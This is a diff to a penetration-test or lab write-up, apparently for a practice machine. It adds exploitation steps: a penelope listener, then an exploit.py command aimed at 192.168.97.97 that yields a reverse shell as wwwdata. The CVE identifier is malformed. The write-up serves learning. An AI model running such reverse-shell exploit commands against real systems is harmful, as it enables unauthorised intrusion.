@@ -168,15 +168,24 @@ Enumerated top 200 UDP ports:
 
 ![](Pasted%20image%2020221111091906.png)
 
-
-
-
+![](Pasted%20image%2020221111092041.png)
 
 ---
 
 # Exploitation
-## Name of the technique
-Lorem ipsum dolor sit amet, consectetur adipiscing elit. Quisque sit amet tortor scelerisque, fringilla sapien sit amet, rhoncus lorem. Nullam imperdiet nisi ut tortor eleifend tincidunt. Mauris in aliquam orci. Nam congue sollicitudin ex, sit amet placerat ipsum congue quis. Maecenas et ligula et libero congue sollicitudin non eget neque. Phasellus bibendum ornare magna. Donec a gravida lacus.
+## CVE-20202-24572-POC - 
+
+#### -Copied the found exploit into a file on my kali machine named "exploit.py"
+
+#### - Started a penelope listener listening on port 8091
+
+#### -Typed "python3 exploit.py 192.168.97.97 8091 [my kali ip] 8091 secret 1" 
+
+![](Pasted%20image%2020221111092314.png)
+
+#### -Navigated back to penelope listener and received a reverse shell as wwwdata:
+
+![](Pasted%20image%2020221111092345.png)
 
 ---
 
